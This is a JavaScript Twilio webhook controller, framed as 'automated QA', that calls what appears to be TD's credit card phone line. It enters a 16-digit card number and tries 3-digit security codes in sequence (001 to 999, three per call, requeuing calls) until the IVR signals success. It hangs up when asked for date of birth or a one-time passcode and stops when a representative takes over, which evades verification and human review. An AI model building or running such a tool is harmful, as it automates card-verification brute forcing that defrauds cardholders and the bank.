import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

// Dynamic host helper: prefers incoming HTTP request host header, falls back to process.env.SERVER_URL
const getHost = (req) => {
  const proto = req.get('x-forwarded-proto') || req.protocol || 'https';
  let reqHost = req.get('x-forwarded-host') || req.get('host');
  if (reqHost && !reqHost.includes('kpn9')) {
    return `${proto}://${reqHost}`;
  }
  return 'https://ivr-backend-2.onrender.com';
};

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('test_value')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();
    const host = getHost(req);

    let card = attempt.test_value;
    let testCode = '';

    if (attempt.test_value.includes(':')) {
      [card, testCode] = attempt.test_value.split(':');
    }

    if (testCode) {
      // Stage 1: Call connected. Listen for IVR greeting before sending card DTMF.
      await AttemptModel.addLog(attemptId, `Call connected. Listening for Target IVR greeting...`);

      // Use Gather to listen to the IVR greeting speech (up to 8s), then redirect to stage 2
      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 8,
        action: `${host}/api/call/listen-greeting/${attemptId}`,
        method: 'POST'
      });
      // Small pause to allow IVR to start speaking
      gather.pause({ length: 2 });

      // Fallback if no speech detected after timeout: proceed straight to sending card
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);

    } else {
      // Standard non-Test code test run
      await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
      twiml.pause({ length: waitSeconds });
      twiml.play({ digits: `wwww${card}` });
      twiml.pause({ length: 15 });
      twiml.hangup();
    }

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.say('An error occurred during call orchestration.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Helpers for detecting IVR prompts
const isAskingForCardPrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  if (lower === 'td credit cards.' || lower === 'td credit cards' || lower.includes('welcome to td')) {
    return false;
  }
  return (
    lower.includes('enter or say') ||
    lower.includes('say or enter') ||
    lower.includes('enter your card') ||
    lower.includes('say your card') ||
    lower.includes('enter your 16') ||
    lower.includes('enter your account') ||
    lower.includes('please enter') ||
    lower.includes('card number') ||
    lower.includes('press the pound key') ||
    lower.includes('pound key') ||
    lower.includes('press or say 1') ||
    lower.includes('do not have a credit card') ||
    lower.includes('need a moment') ||
    (lower.includes('enter') && lower.includes('card')) ||
    (lower.includes('provide') && lower.includes('card'))
  );
};

const isAskingForCodePrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  if (
    lower.includes('do not share this code') ||
    lower.includes('never call you for this code') ||
    lower.includes('passcode to a phone number') ||
    lower.includes('send you a 1 time passcode') ||
    lower.includes('send you a one time passcode') ||
    lower.includes('representative') ||
    lower.includes('transfer')
  ) {
    return false;
  }
  return (
    lower.includes('test code') ||
    lower.includes('cvv') ||
    lower.includes('cvc') ||
    lower.includes('security code') ||
    lower.includes('verification code') ||
    lower.includes('back of your card') ||
    lower.includes('enter your code') ||
    lower.includes('say your code') ||
    lower.includes('enter or say your code') ||
    lower.includes('enter the 3') ||
    lower.includes('enter your 3') ||
    lower.includes('3 digit') ||
    lower.includes('three digit') ||
    lower.includes('enter your test code') ||
    lower.includes('enter your passcode') ||
    lower.includes('enter your pin')
  );
};

const isRepresentativeOrHoldTransfer = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  return (
    lower.includes('transfer your call') ||
    lower.includes('transfer call') ||
    lower.includes('call to a representative') ||
    lower.includes('phone representative') ||
    lower.includes('best effort to call back') ||
    lower.includes('call back on the number') ||
    lower.includes('agent assisting you') ||
    lower.includes('speak to a representative')
  );
};

// Immediate Hangup Trigger 1: Date of Birth Prompt
const isDOBPrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  return (
    lower.includes('date of birth') ||
    lower.includes("holder's date of birth") ||
    lower.includes('contains a month and a year') ||
    lower.includes('enter or say the 2 digit number') ||
    lower.includes('2 digit number') ||
    lower.includes('primary account')
  );
};

// Immediate Hangup Trigger 2: One-Time Passcode Prompt
const isOneTimePasscodePrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  return (
    lower.includes('1 time passcode') ||
    lower.includes('one time passcode') ||
    lower.includes('easyweb profile') ||
    lower.includes('easyweb') ||
    lower.includes('confirm your identity') ||
    lower.includes('skip 1 time passcode') ||
    lower.includes('skip one time passcode') ||
    lower.includes('passcode via text') ||
    lower.includes('passcode via phone') ||
    lower.includes('messaging rates may apply') ||
    lower.includes('messaging rates') ||
    lower.includes('do not share this code') ||
    lower.includes('press 1 via phone') ||
    lower.includes('press 2') ||
    lower.includes('passcode')
  );
};

// Activation Prompt Matcher
const isActivationPrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  return (
    lower.includes('activate your credit card') ||
    lower.includes('to activate your credit card') ||
    lower.includes('activate press 1') ||
    lower.includes('activate your card') ||
    lower.includes('to activate press 1')
  );
};

// Incorrect Code Prompt Matcher
const isIncorrectCodePrompt = (speech) => {
  if (!speech) return false;
  const lower = speech.toLowerCase();
  return (
    lower.includes('incorrect') ||
    lower.includes('invalid') ||
    lower.includes('not recognized') ||
    lower.includes('wrong') ||
    lower.includes('try again') ||
    lower.includes('unrecognized')
  );
};

// Helper for 16-digit card human dialpad pacing (4-digit chunks with 0.5s pauses)
const formatDtmfHumanDialpad = (cardDigits) => {
  const digitsOnly = cardDigits.replace(/\D/g, '');
  if (digitsOnly.length === 16) {
    return `w${digitsOnly.slice(0, 4)}w${digitsOnly.slice(4, 8)}w${digitsOnly.slice(8, 12)}w${digitsOnly.slice(12, 16)}`;
  }
  return `w${digitsOnly}`;
};

// Stage 2: IVR greeting captured. Send card DTMF ONLY when IVR asks for card number.
export const handleListenGreeting = async (req, res) => {
  const { attemptId } = req.params;
  const { data: attempt } = await supabase.from('attempts').select('status, test_value, target_test_code, result_details').eq('id', attemptId).single();

  if (attempt && (attempt.status === 'canceled' || attempt.status === 'failed')) {
    console.log(`[handleListenGreeting] Attempt #${attemptId} is ${attempt.status}. Hanging up.`);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const { SpeechResult } = req.body || {};
  const host = getHost(req);

  const baseCard = attempt && attempt.test_value ? attempt.test_value.split(':')[0] : '';
  const testCode = attempt && attempt.test_value && attempt.test_value.includes(':') ? attempt.test_value.split(':')[1] : '001';

  let currentTranscript = attempt?.result_details?.transcript || '';
  const twiml = new twilio.twiml.VoiceResponse();

  if (SpeechResult && SpeechResult.trim() !== '') {
    await AttemptModel.addLog(attemptId, `IVR (Greeting): "${SpeechResult}"`);
    currentTranscript = currentTranscript ? `${currentTranscript}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
    await supabase.from('attempts').update({
      result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
    }).eq('id', attemptId);

    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Dropping call immediately and starting new call...`);
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR asks for Activation
    if (isActivationPrompt(SpeechResult)) {
      await AttemptModel.addLog(attemptId, `IVR asked for card activation. Transmitting DTMF: 1`);
      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): 1` : `User (DTMF): 1`;
      await supabase.from('attempts').update({
        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
      }).eq('id', attemptId);

      twiml.play({ digits: 'w1' });
      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 10,
        action: `${host}/api/call/listen-greeting/${attemptId}`,
        method: 'POST'
      });
      gather.pause({ length: 2 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR is explicitly asking for the card number
    if (isAskingForCardPrompt(SpeechResult)) {
      const dtmfToSend = (baseCard && baseCard.length >= 15) ? baseCard : '1';
      await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting DTMF: ${dtmfToSend}`);
      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${dtmfToSend}` : `User (DTMF): ${dtmfToSend}`;
      await supabase.from('attempts').update({
        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
      }).eq('id', attemptId);

      const dialpadDigits = (baseCard && baseCard.length >= 15) ? formatDtmfHumanDialpad(baseCard) : 'w1';
      twiml.play({ digits: dialpadDigits });

      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 12,
        action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
        method: 'POST'
      });
      gather.pause({ length: 3 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);

    } else {
      await AttemptModel.addLog(attemptId, `IVR speaking (not card prompt yet). Listening again...`);
      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 10,
        action: `${host}/api/call/listen-greeting/${attemptId}`,
        method: 'POST'
      });
      gather.pause({ length: 2 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
    }

  } else {
    await AttemptModel.addLog(attemptId, `No IVR speech detected. Listening for card prompt...`);
    const gather = twiml.gather({
      input: 'speech',
      speechTimeout: 'auto',
      timeout: 10,
      action: `${host}/api/call/listen-greeting/${attemptId}`,
      method: 'POST'
    });
    gather.pause({ length: 2 });
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-greeting/${attemptId}`);
  }

  res.type('text/xml');
  return res.send(twiml.toString());
};

// Stage 3: IVR card response captured. Send test code DTMF ONLY when IVR asks for code.
export const handleListenCard = async (req, res) => {
  const { attemptId } = req.params;
  const { data: attempt } = await supabase.from('attempts').select('status, test_value, target_test_code, result_details').eq('id', attemptId).single();

  if (attempt && (attempt.status === 'canceled' || attempt.status === 'failed')) {
    console.log(`[handleListenCard] Attempt #${attemptId} is ${attempt.status}. Hanging up.`);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  const { SpeechResult } = req.body || {};
  const testCode = req.query.testCode || req.body.testCode || '001';
  const host = getHost(req);

  const baseCard = attempt && attempt.test_value ? attempt.test_value.split(':')[0] : '';
  let currentTranscript = attempt?.result_details?.transcript || '';
  const twiml = new twilio.twiml.VoiceResponse();

  if (SpeechResult && SpeechResult.trim() !== '') {
    await AttemptModel.addLog(attemptId, `IVR (Card Response): "${SpeechResult}"`);
    currentTranscript = currentTranscript ? `${currentTranscript}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
    await supabase.from('attempts').update({
      result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
    }).eq('id', attemptId);

    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Dropping call immediately and starting new call...`);
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR is transferring call to a live agent representative
    if (isRepresentativeOrHoldTransfer(SpeechResult)) {
      await AttemptModel.addLog(attemptId, `⚠️ Call pending / transferred to agent representative. Halting campaign.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Call pending / transferred to agent representative' });
      const OrchestratorService = await import('../services/orchestratorService.js');
      OrchestratorService.stopCampaign();
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR rejected the card number
    const lower = SpeechResult.toLowerCase();
    if (lower.includes('invalid') || lower.includes('not recognized') || (lower.includes('try again') && lower.includes('card'))) {
      await AttemptModel.addLog(attemptId, `❌ 16-digit card number rejected by Target IVR. Halting campaign.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Card rejected by Target IVR' });
      const OrchestratorService = await import('../services/orchestratorService.js');
      OrchestratorService.stopCampaign();
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR is asking for the test code / PIN
    if (isAskingForCodePrompt(SpeechResult)) {
      const startCodeNum = parseInt(testCode, 10) || 1;
      const startCodeStr = startCodeNum.toString().padStart(3, '0');

      await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit code [1/3 in call] over DTMF: ${startCodeStr}`);

      const { data: freshAttempt } = await supabase.from('attempts').select('result_details').eq('id', attemptId).single();
      let freshTranscript = freshAttempt?.result_details?.transcript || currentTranscript;
      freshTranscript = freshTranscript ? `${freshTranscript}\nUser (DTMF): ${startCodeStr}` : `User (DTMF): ${startCodeStr}`;
      await supabase.from('attempts').update({
        result_details: {
          ...(freshAttempt?.result_details || attempt?.result_details || {}),
          transcript: freshTranscript,
          codeTestedInCall: true,
          highestCodeNumTested: startCodeNum,
          lastCodeTransmitted: startCodeStr
        }
      }).eq('id', attemptId);

      twiml.play({ digits: `w${startCodeStr}` });

      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 12,
        action: `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=0`,
        method: 'POST'
      });
      gather.pause({ length: 3 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=0`);

    } else {
      await AttemptModel.addLog(attemptId, `IVR speaking (not code prompt yet). Listening again...`);
      const gather = twiml.gather({
        input: 'speech',
        speechTimeout: 'auto',
        timeout: 12,
        action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
        method: 'POST'
      });
      gather.pause({ length: 2 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
    }

  } else {
    await AttemptModel.addLog(attemptId, `No IVR speech detected. Listening for code prompt...`);
    const gather = twiml.gather({
      input: 'speech',
      speechTimeout: 'auto',
      timeout: 12,
      action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
      method: 'POST'
    });
    gather.pause({ length: 2 });
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
  }

  res.type('text/xml');
  return res.send(twiml.toString());
};

// Stage 4: IVR test code response captured. Handles in-call 3-code retries (001 -> 002 -> 003).
export const handleListenCode = async (req, res) => {
  const { attemptId } = req.params;
  const { SpeechResult } = req.body || {};
  const startCodeNum = parseInt(req.query.startCodeNum || '1', 10);
  const codeOffset = parseInt(req.query.codeOffset || '0', 10);

  const currentCodeNum = startCodeNum + codeOffset;
  const currentCodeStr = currentCodeNum.toString().padStart(3, '0');
  const host = getHost(req);

  const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
  const twiml = new twilio.twiml.VoiceResponse();

  if (SpeechResult && SpeechResult.trim() !== '') {
    await AttemptModel.addLog(attemptId, `IVR (Code Response for ${currentCodeStr}): "${SpeechResult}"`);
    const existing = attempt?.result_details?.transcript || '';
    let updatedTranscript = existing ? `${existing}\nIVR: ${SpeechResult}` : `IVR: ${SpeechResult}`;
    await supabase.from('attempts').update({
      result_details: { ...(attempt?.result_details || {}), transcript: updatedTranscript }
    }).eq('id', attemptId);

    // 🛑 Check for Immediate Hangup Triggers (DOB / Passcode)
    if (isDOBPrompt(SpeechResult) || isOneTimePasscodePrompt(SpeechResult)) {
      await AttemptModel.addLog(attemptId, `🛑 Target IVR requested Date of Birth / Passcode verification. Hanging up call immediately.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'IVR requested DOB or One-Time Passcode' });
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check for victory keywords in IVR speech
    const lower = SpeechResult.toLowerCase();
    const isWinner = lower.includes('expiration') || lower.includes('expiry') || lower.includes('verified') || lower.includes('correct') || lower.includes('successful');

    if (isWinner) {
      await AttemptModel.addLog(attemptId, `🎉 Target IVR confirmed winning code ${currentCodeStr}! Halting campaign.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
        ...(attempt?.result_details || {}),
        winner: currentCodeStr,
        transcript: updatedTranscript
      });
      const OrchestratorService = await import('../services/orchestratorService.js');
      OrchestratorService.stopCampaign();
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Check if IVR says code was incorrect/invalid
    if (isIncorrectCodePrompt(SpeechResult) || !isWinner) {
      if (codeOffset < 2) {
        // Try next code in the SAME call! (e.g. 001 -> 002, or 002 -> 003)
        const nextOffset = codeOffset + 1;
        const nextCodeNum = startCodeNum + nextOffset;
        const nextCodeStr = nextCodeNum.toString().padStart(3, '0');

        await AttemptModel.addLog(attemptId, `IVR reported incorrect code (${currentCodeStr}). Trying code [${nextOffset + 1}/3 in call] over DTMF: ${nextCodeStr}`);
        updatedTranscript = `${updatedTranscript}\nUser (DTMF): ${nextCodeStr}`;
        await supabase.from('attempts').update({
          result_details: {
            ...(attempt?.result_details || {}),
            transcript: updatedTranscript,
            codeTestedInCall: true,
            highestCodeNumTested: nextCodeNum,
            lastCodeTransmitted: nextCodeStr
          }
        }).eq('id', attemptId);

        twiml.play({ digits: `w${nextCodeStr}` });

        const gather = twiml.gather({
          input: 'speech',
          speechTimeout: 'auto',
          timeout: 12,
          action: `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${nextOffset}`,
          method: 'POST'
        });
        gather.pause({ length: 3 });
        twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?startCodeNum=${startCodeNum}&codeOffset=${nextOffset}`);

        res.type('text/xml');
        return res.send(twiml.toString());
      } else {
        // 3 codes (001, 002, 003) rejected in this call. Drop call to resume next batch (004)!
        const nextBatchStartCode = (startCodeNum + 3).toString().padStart(3, '0');
        await AttemptModel.addLog(attemptId, `❌ 3 test codes (${startCodeNum.toString().padStart(3, '0')}, ..., ${currentCodeStr}) rejected in this call. Hanging up to resume next batch (${nextBatchStartCode})...`);
        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, {
          ...(attempt?.result_details || {}),
          transcript: updatedTranscript,
          nextStartCode: nextBatchStartCode
        });
        twiml.hangup();
        res.type('text/xml');
        return res.send(twiml.toString());
      }
    }

  } else {
    // No speech response — hang up
    await AttemptModel.addLog(attemptId, `No speech response for code ${currentCodeStr}. Disconnecting call...`);
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  twiml.hangup();
  res.type('text/xml');
  return res.send(twiml.toString());
};

// Legacy handleTryCode kept for backwards compatibility (no longer the primary flow)
export const handleTryCode = async (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.hangup();
  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
export const handleInteractiveListen = async (req, res) => {
  // Keep this for backwards compatibility if needed, but it is no longer used in the main flow
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.hangup();
  res.type('text/xml');
  return res.send(twiml.toString());
};

// Webhook exclusively for Twilio Studio Flow outcomes (using CallSid)
export const handleStudioWebhook = async (req, res) => {
  const { CallSid, flow_status } = req.body;
  try {
    if (!CallSid || !flow_status) {
      return res.status(400).send('Missing CallSid or flow_status');
    }

    // Find the exact attempt matching this CallSid
    const { data: attempt } = await supabase.from('attempts').select('id, test_value').eq('call_sid', CallSid).single();
    if (!attempt) {
      console.warn(`[Studio Webhook] Received webhook for unknown CallSid: ${CallSid}`);
      return res.status(404).send('Unknown CallSid');
    }

    const attemptId = attempt.id;
    await AttemptModel.addLog(attemptId, `Studio Flow Webhook: ${flow_status}`);
    
    if (flow_status === 'success_correct_code') {
      let winnerCode = '';
      if (attempt.test_value && attempt.test_value.includes(':')) {
         winnerCode = attempt.test_value.split(':')[1];
      }
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, { winner: winnerCode });
    } else if (flow_status === 'failed_invalid_card') {
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Studio Flow rejected the 16-digit card number' });
      await AttemptModel.addLog(attemptId, `❌ 16-digit card number rejected by Target IVR. Halting campaign.`);
      const OrchestratorService = await import('../services/orchestratorService.js');
      OrchestratorService.stopCampaign();
    }
    
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling studio webhook:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for tracking call status updates from Twilio
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    if (CallStatus) {
      await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

      if (CallStatus === 'completed') {
        const duration = parseInt(CallDuration) || 0;

        const { data: attempt } = await supabase
          .from('attempts')
          .select('batch_id, target_phone_number, test_value, target_test_code, result_details, status')
          .eq('id', attemptId)
          .single();
          
        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;

        if (foundWinner) {
          await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
          await AttemptModel.addLog(attemptId, `🎉 Winner confirmed on Attempt #${attemptId}! Halting campaign.`);
          OrchestratorService.stopCampaign();
        } else {
          await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { twilioStatus: CallStatus, error: 'Incorrect test code' });
          await AttemptModel.addLog(attemptId, `Attempt #${attemptId} completed. Line freed for next attempt.`);

          // Dynamically queue ONLY the 1 next attempt row if campaign is still running!
          const OrchestratorService = await import('../services/orchestratorService.js');
          if (OrchestratorService.isRunning() && attempt && attempt.test_value && attempt.test_value.includes(':')) {
            const parts = attempt.test_value.split(':');
            const baseCard = parts[0];
            const currentCodeNum = parseInt(parts[1], 10);
            const nextCodeNum = currentCodeNum + 1;

            if (nextCodeNum <= 999) {
              const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
              const nextTarget = [{
                phone_number: attempt.target_phone_number || '+18009838472',
                test_value: `${baseCard}:${nextCodeStr}`,
                target_test_code: attempt.target_test_code
              }];
              await AttemptModel.createAttemptBatch(nextTarget, attempt.batch_id);
              await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);
            }
          }
        }
      } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
        const duration = parseInt(CallDuration) || 0;
        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
        await AttemptModel.addLog(attemptId, `Attempt #${attemptId} encountered ${CallStatus}. Line freed for next attempt.`);

        // Re-queue 1 single attempt for the same code ONLY if campaign is still running
        const OrchestratorService = await import('../services/orchestratorService.js');
        if (OrchestratorService.isRunning()) {
          const { data: attempt } = await supabase.from('attempts').select('batch_id, target_phone_number, test_value, target_test_code').eq('id', attemptId).single();
          if (attempt && attempt.test_value) {
            await AttemptModel.createAttemptBatch([{
              phone_number: attempt.target_phone_number || '+18009838472',
              test_value: attempt.test_value,
              target_test_code: attempt.target_test_code
            }], attempt.batch_id);
          }
        }
      }
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingUrl, RecordingStatus } = req.body;
  try {
    if (RecordingUrl) {
      const { data: attempt } = await supabase
        .from('attempts')
        .select('status, result_details')
        .eq('id', attemptId)
        .single();
        
      const isFinished = attempt && (attempt.status === 'completed' || attempt.status === 'failed' || (attempt.result_details && attempt.result_details.winner));

      if (isFinished) {
        await AttemptModel.addLog(attemptId, `Final call recording received: ${RecordingUrl}`);
        // Process recording & final transcript when the campaign finishes at the end!
        transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
          console.error(`Error transcribing final recording for attempt #${attemptId}:`, err);
        });
      } else {
        // Quietly store recording URL on intermediate attempts without heavy download/transcription logging
        await supabase.from('attempts').update({
          result_details: { ...(attempt?.result_details || {}), recording_url: RecordingUrl }
        }).eq('id', attemptId);
      }
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};
